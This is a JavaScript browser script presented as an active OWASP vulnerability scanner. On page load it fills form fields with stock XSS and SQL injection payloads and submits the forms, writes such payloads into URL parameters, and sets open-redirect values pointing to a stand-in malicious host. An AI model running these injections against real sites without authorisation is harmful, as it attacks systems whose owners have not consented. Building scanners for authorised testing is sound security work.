(function() {
    console.log("Starting active scan for OWASP vulnerabilities...");

    // XSS Payloads to inject in all input fields and URLs
    const xssPayloads = [
        `<script>alert("XSS")</script>`,
        `"><script>alert(1)</script>`,
        `'><script>alert(1)</script>`
    ];

    // SQL Injection payloads to inject in form fields and query parameters
    const sqliPayloads = [
        `' OR 1=1 --`,
        `" OR 1=1 --`,
        `admin' --`,
        `admin" --`,
        `' OR '1'='1`,
        `" OR "1"="1`,
    ];

    // Test for reflected XSS in form inputs
    function testXSS() {
        const forms = document.forms;

        // Inject XSS payloads into each form input and submit the form
        for (let form of forms) {
            for (let payload of xssPayloads) {
                for (let input of form.elements) {
                    if (input.type === "text" || input.type === "search" || input.type === "url") {
                        input.value = payload;
                        console.log(`Testing XSS with payload: ${payload} on input field: ${input.name}`);
                    }
                }
                // Submit the form after modifying inputs
                form.submit();
            }
        }

        // Inject XSS payload into URL query string
        xssPayloads.forEach(payload => {
            let url = new URL(window.location.href);
            url.searchParams.set("q", payload);
            console.log(`Testing XSS with URL: ${url}`);
            window.history.pushState({}, '', url.toString()); // Push new state to avoid page reload
        });
    }

    // Test for SQL Injection vulnerabilities in form inputs and URL query strings
    function testSQLi() {
        const forms = document.forms;

        // Inject SQLi payloads into each form input and submit the form
        for (let form of forms) {
            for (let payload of sqliPayloads) {
                for (let input of form.elements) {
                    if (input.type === "text" || input.type === "search" || input.type === "url") {
                        input.value = payload;
                        console.log(`Testing SQLi with payload: ${payload} on input field: ${input.name}`);
                    }
                }
                // Submit the form after modifying inputs
                form.submit();
            }
        }

        // Inject SQLi payload into URL query string
        sqliPayloads.forEach(payload => {
            let url = new URL(window.location.href);
            url.searchParams.set("q", payload);
            console.log(`Testing SQLi with URL: ${url}`);
            window.history.pushState({}, '', url.toString()); // Push new state to avoid page reload
        });
    }

    // Test for CSRF by detecting unprotected forms (forms without anti-CSRF tokens)
    function testCSRF() {
        const forms = document.forms;

        for (let form of forms) {
            let csrfProtected = false;
            for (let input of form.elements) {
                if (input.type === "hidden" && (input.name.toLowerCase().includes("csrf") || input.name.toLowerCase().includes("token"))) {
                    csrfProtected = true;
                }
            }
            if (!csrfProtected) {
                console.warn(`Potential CSRF vulnerability detected in form with action: ${form.action}`);
            } else {
                console.log(`Form with action ${form.action} seems to be CSRF protected.`);
            }
        }
    }

    // Test for open redirects by detecting suspicious URL parameters
    function testOpenRedirect() {
        let links = document.querySelectorAll("a[href]");
        links.forEach(link => {
            if (link.href.includes("redirect=") || link.href.includes("url=")) {
                console.warn(`Potential Open Redirect detected: ${link.href}`);
            }
        });

        // Test Open Redirect by injecting redirect payloads in query parameters
        const redirectPayloads = [
            `http://malicious-site.com`,
            `//malicious-site.com`,
        ];
        redirectPayloads.forEach(payload => {
            let url = new URL(window.location.href);
            url.searchParams.set("redirect", payload);
            console.log(`Testing Open Redirect with URL: ${url}`);
            window.history.pushState({}, '', url.toString()); // Push new state to avoid page reload
        });
    }

    // Test for insecure forms (no HTTPS or missing CSRF tokens)
    function testInsecureForms() {
        const forms = document.forms;

        for (let form of forms) {
            if (!form.action.startsWith('https')) {
                console.warn(`Insecure form submission: Form with action ${form.action} is using HTTP, not HTTPS.`);
            }
        }
    }

    // Run all vulnerability checks
    function runVulnerabilityScan() {
        console.log("Running vulnerability scan...");
        
        // Test XSS
        testXSS();

        // Test SQL Injection
        testSQLi();

        // Test CSRF
        testCSRF();

        // Test Open Redirect
        testOpenRedirect();

        // Check for insecure forms
        testInsecureForms();
    }

    // Trigger scan when page loads
    window.onload = runVulnerabilityScan;
})();
